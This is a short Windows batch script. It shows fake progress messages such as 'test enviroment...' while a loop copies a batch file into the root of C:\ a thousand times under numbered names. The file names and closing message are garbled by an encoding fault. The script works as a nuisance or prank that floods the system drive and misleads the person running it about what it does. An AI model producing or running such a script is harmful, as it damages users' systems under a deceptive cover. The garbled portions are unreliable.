@echo off
ping -n 4 127.0.0.1>nul
echo produce begin...
ping -n 3 127.0.0.1>nul
echo test enviroment...
set count=0
:loop1
set/a count+=1
if %count% gtr 1000 goto :end
copy ������.bat C:\������%count%��.bat >nul
goto :loop1
:end
echo �������C��
pause >nul
exit